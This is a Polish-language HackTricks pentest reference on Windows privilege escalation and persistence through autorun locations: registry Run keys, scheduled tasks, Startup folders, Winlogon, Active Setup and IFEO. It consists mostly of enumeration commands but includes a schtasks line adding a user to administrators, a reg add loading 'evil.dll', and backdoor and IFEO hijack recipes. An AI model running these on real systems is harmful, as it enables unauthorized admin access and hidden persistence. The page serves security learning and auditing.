# Eskalacja uprawnień za pomocą Autoruns

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Jeśli interesuje Cię **kariera hakerska** i hakowanie niemożliwych do zhakowania rzeczy - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim w mowie i piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

## WMIC

**Wmic** można użyć do uruchamiania programów podczas **uruchamiania systemu**. Sprawdź, które pliki binarne są zaprogramowane do uruchamiania się podczas uruchamiania systemu za pomocą:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Zaplanowane zadania

**Zadania** mogą być zaplanowane do uruchamiania z **określoną częstotliwością**. Sprawdź, które pliki binarne są zaplanowane do uruchomienia za pomocą:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Foldery

Wszystkie pliki binarne znajdujące się w folderach **Startup zostaną uruchomione przy starcie systemu**. Wspólne foldery startupu to te wymienione poniżej, ale folder startupu jest wskazany w rejestrze. [Przeczytaj to, aby dowiedzieć się gdzie.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
## Rejestr

{% hint style="info" %}
[Informacja z tego miejsca](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Wpis w rejestrze **Wow6432Node** wskazuje, że używasz wersji systemu Windows 64-bitowej. System operacyjny używa tego klucza do wyświetlania oddzielnego widoku HKEY\_LOCAL\_MACHINE\SOFTWARE dla aplikacji 32-bitowych uruchamianych na wersjach systemu Windows 64-bitowych.
{% endhint %}

### Uruchamianie

Powszechnie znane wpisy w rejestrze AutoRun:

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
* `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
* `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Klucze rejestru o nazwach **Run** i **RunOnce** są przeznaczone do automatycznego uruchamiania programów za każdym razem, gdy użytkownik loguje się do systemu. Wartość danych przypisana do klucza wiersza poleceń jest ograniczona do 260 znaków lub mniej.

**Uruchamianie usług** (może kontrolować automatyczne uruchamianie usług podczas uruchamiania):

* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
* `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
* `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

* `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
* `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

W systemach Windows Vista i nowszych wersjach klucze rejestru **Run** i **RunOnce** nie są generowane automatycznie. Wpisy w tych kluczach mogą bezpośrednio uruchamiać programy lub określać je jako zależności. Na przykład, aby załadować plik DLL podczas logowania, można użyć klucza rejestru **RunOnceEx** wraz z kluczem "Depend". Przykładem jest dodanie wpisu w rejestrze, który uruchamia "C:\\temp\\evil.dll" podczas uruchamiania systemu:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
{% hint style="info" %}
**Exploit 1**: Jeśli możesz zapisywać w dowolnym z wymienionych kluczy rejestru w **HKLM**, możesz podnieść uprawnienia, gdy inny użytkownik się zaloguje.
{% endhint %}

{% hint style="info" %}
**Exploit 2**: Jeśli możesz nadpisać dowolny z binarnych plików wskazanych w którymkolwiek z kluczy rejestru w **HKLM**, możesz zmodyfikować ten plik binarny z tylnymi drzwiami, gdy inny użytkownik się zaloguje i podnieść uprawnienia.
{% endhint %}
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Ścieżka uruchamiania

* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
* `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Skróty umieszczone w folderze **Startup** automatycznie uruchamiają usługi lub aplikacje podczas logowania użytkownika lub ponownego uruchomienia systemu. Lokalizacja folderu **Startup** jest zdefiniowana w rejestrze zarówno dla zakresu **Local Machine**, jak i **Current User**. Oznacza to, że każdy skrót dodany do tych określonych lokalizacji **Startup** spowoduje uruchomienie powiązanej usługi lub programu po procesie logowania lub ponownym uruchomieniu, co czyni to prostą metodą planowania automatycznego uruchamiania programów.

{% hint style="info" %}
Jeśli możesz nadpisać dowolny folder \[User] Shell w **HKLM**, będziesz mógł wskazać go na folder kontrolowany przez Ciebie i umieścić tylną furtkę, która zostanie wykonana za każdym razem, gdy użytkownik zaloguje się do systemu, podnosząc uprawnienia.
{% endhint %}
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### Klucze Winlogon

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Zazwyczaj klucz **Userinit** jest ustawiony na **userinit.exe**. Jednak jeśli ten klucz zostanie zmodyfikowany, określony plik wykonywalny zostanie również uruchomiony przez **Winlogon** po zalogowaniu użytkownika. Podobnie klucz **Shell** ma wskazywać na **explorer.exe**, który jest domyślną powłoką systemu Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
{% hint style="info" %}
Jeśli możesz nadpisać wartość rejestru lub plik binarny, będziesz w stanie podnieść uprawnienia.
{% endhint %}

### Ustawienia polityki

* `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
* `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Sprawdź klucz **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Zmiana polecenia w trybie awaryjnym

W rejestrze systemu Windows, pod adresem `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, domyślnie ustawiona jest wartość **`AlternateShell`** na `cmd.exe`. Oznacza to, że gdy wybierasz "Tryb awaryjny z wierszem polecenia" podczas uruchamiania (poprzez naciśnięcie klawisza F8), używane jest `cmd.exe`. Jednak można skonfigurować komputer tak, aby automatycznie uruchamiał się w tym trybie, bez konieczności naciskania F8 i ręcznego wybierania go.

Kroki do utworzenia opcji rozruchowej dla automatycznego uruchamiania w trybie "Tryb awaryjny z wierszem polecenia":

1. Zmień atrybuty pliku `boot.ini`, aby usunąć flagi tylko do odczytu, systemowe i ukryte: `attrib c:\boot.ini -r -s -h`
2. Otwórz `boot.ini` do edycji.
3. Wstaw linię taką jak: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Zapisz zmiany w `boot.ini`.
5. Przywróć pierwotne atrybuty pliku: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Zmiana klucza rejestru **AlternateShell** umożliwia dostosowanie niestandardowego powłoki polecenia, potencjalnie dla nieautoryzowanego dostępu.
- **Exploit 2 (Uprawnienia do zapisu w PATH):** Posiadanie uprawnień do zapisu w dowolnej części zmiennej systemowej **PATH**, zwłaszcza przed `C:\Windows\system32`, pozwala na wykonanie niestandardowego `cmd.exe`, który może być tylnymi drzwiami, jeśli system zostanie uruchomiony w trybie awaryjnym.
- **Exploit 3 (Uprawnienia do zapisu w PATH i boot.ini):** Uprawnienia do zapisu w `boot.ini` umożliwiają automatyczne uruchamianie w trybie awaryjnym, ułatwiając nieautoryzowany dostęp przy następnym ponownym uruchomieniu.

Aby sprawdzić bieżące ustawienie **AlternateShell**, użyj tych poleceń:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Zainstalowany komponent

Active Setup to funkcja w systemie Windows, która **inicjuje się przed pełnym załadowaniem środowiska pulpitu**. Priorytetowo wykonuje określone polecenia, które muszą zostać zakończone przed kontynuacją logowania użytkownika. Ten proces zachodzi nawet przed uruchomieniem innych wpisów startowych, takich jak te w sekcjach rejestru Run lub RunOnce.

Active Setup jest zarządzany za pomocą następujących kluczy rejestru:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

W tych kluczach istnieją różne podklucze, z których każdy odpowiada określonemu komponentowi. Wartości kluczy, które są szczególnie istotne, to:

- **IsInstalled:**
- `0` oznacza, że polecenie komponentu nie zostanie wykonane.
- `1` oznacza, że polecenie zostanie wykonane raz dla każdego użytkownika, co jest domyślnym zachowaniem, jeśli wartość `IsInstalled` jest brakująca.
- **StubPath:** Określa polecenie, które ma zostać wykonane przez Active Setup. Może to być dowolna poprawna linia poleceń, na przykład uruchomienie `notatnika`.

**Wskazówki dotyczące bezpieczeństwa:**

- Modyfikowanie lub zapisywanie klucza, w którym **`IsInstalled`** jest ustawione na `"1"` z określonym **`StubPath`**, może prowadzić do nieautoryzowanego wykonania poleceń, potencjalnie umożliwiającego eskalację uprawnień.
- Zmiana pliku binarnego, do którego odwołuje się wartość **`StubPath`**, może również umożliwić eskalację uprawnień, pod warunkiem posiadania wystarczających uprawnień.

Aby sprawdzić konfiguracje **`StubPath`** dla komponentów Active Setup, można użyć tych poleceń:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Obiekty pomocnicze przeglądarki

### Przegląd obiektów pomocniczych przeglądarki (BHO)

Obiekty pomocnicze przeglądarki (BHO) to moduły DLL, które dodają dodatkowe funkcje do przeglądarki Internet Explorer firmy Microsoft. Ładują się do przeglądarki Internet Explorer i Eksploratora Windows przy każdym uruchomieniu. Jednak ich wykonanie można zablokować, ustawiając klucz **NoExplorer** na wartość 1, co uniemożliwia ich ładowanie w przypadku wystąpienia instancji Eksploratora Windows.

BHO są kompatybilne z systemem Windows 10 za pośrednictwem przeglądarki Internet Explorer 11, ale nie są obsługiwane w Microsoft Edge, domyślnej przeglądarce w nowszych wersjach systemu Windows.

Aby sprawdzić zarejestrowane na systemie BHO, można sprawdzić następujące klucze rejestru:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Każdy BHO jest reprezentowany przez swoje **CLSID** w rejestrze, który służy jako unikalny identyfikator. Szczegółowe informacje na temat każdego CLSID można znaleźć w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Do zapytania BHO w rejestrze można wykorzystać następujące polecenia:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Rozszerzenia Internet Explorera

* `HKLM\Software\Microsoft\Internet Explorer\Extensions`
* `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Należy zauważyć, że w rejestrze będzie zawarte 1 nowe wpis dla każdej biblioteki DLL, a będzie ono reprezentowane przez **CLSID**. Informacje o CLSID można znaleźć w `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Sterowniki czcionek

* `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
* `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Otwórz polecenie

* `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
* `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Opcje Wykonywania Plików Obrazów

Image File Execution Options (IFEO) to mechanizm w systemie Windows, który umożliwia manipulację sposobem, w jaki aplikacje są uruchamiane. Może być wykorzystany do eskalacji uprawnień lokalnych.

#### Dodawanie wpisów IFEO

Aby dodać wpis IFEO, należy utworzyć klucz rejestru o nazwie aplikacji, dla której chcemy zmienić sposób uruchamiania, w ścieżce `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`. Następnie, w tym kluczu, utwórz podklucz o nazwie `Debugger` i ustaw jego wartość na ścieżkę do pliku wykonywalnego, który zostanie uruchomiony zamiast oryginalnej aplikacji.

#### Wykorzystanie wpisów IFEO do eskalacji uprawnień

Wykorzystanie wpisów IFEO do eskalacji uprawnień polega na utworzeniu wpisu IFEO dla aplikacji, która jest uruchamiana z uprawnieniami administratora. Następnie, w wartości `Debugger`, ustawiamy ścieżkę do naszego własnego pliku wykonywalnego, który zostanie uruchomiony z uprawnieniami administratora. W ten sposób, gdy aplikacja zostanie uruchomiona, nasz plik wykonywalny zostanie uruchomiony zamiast niej, dając nam uprawnienia administratora.

#### Przykład

Aby zobrazować to na przykładzie, załóżmy, że mamy aplikację o nazwie `target.exe`, która jest uruchamiana z uprawnieniami administratora. Chcemy uzyskać uprawnienia administratora, więc tworzymy wpis IFEO dla `target.exe` i ustawiamy wartość `Debugger` na ścieżkę do naszego własnego pliku wykonywalnego `evil.exe`. Gdy `target.exe` zostanie uruchomiony, zamiast niego zostanie uruchomiony `evil.exe`, dając nam uprawnienia administratora.

#### Zabezpieczenia przed eskalacją uprawnień z wykorzystaniem wpisów IFEO

Aby zabezpieczyć się przed eskalacją uprawnień z wykorzystaniem wpisów IFEO, można usunąć niepotrzebne wpisy z klucza rejestru `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options`. Można również ograniczyć uprawnienia do tego klucza, aby tylko uprawnienia administratora miały możliwość modyfikacji wpisów IFEO.
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Należy zauważyć, że wszystkie strony, na których można znaleźć autostarty, **zostały już przeszukane przez** [**winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Jednak dla **bardziej kompleksowej listy** plików uruchamianych automatycznie można użyć [autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) z systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Więcej

**Znajdź więcej programów uruchamianych automatycznie, takich jak rejestry, na stronie [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)**

## Odwołania

* [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
* [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
* [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2)
* [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Jeśli interesuje Cię **kariera hakera** i chcesz zhakować to, co nie do zhakowania - **zatrudniamy!** (_wymagane biegłe posługiwanie się językiem polskim, zarówno w mowie, jak i w piśmie_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) **i** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **na GitHubie.**

</details>
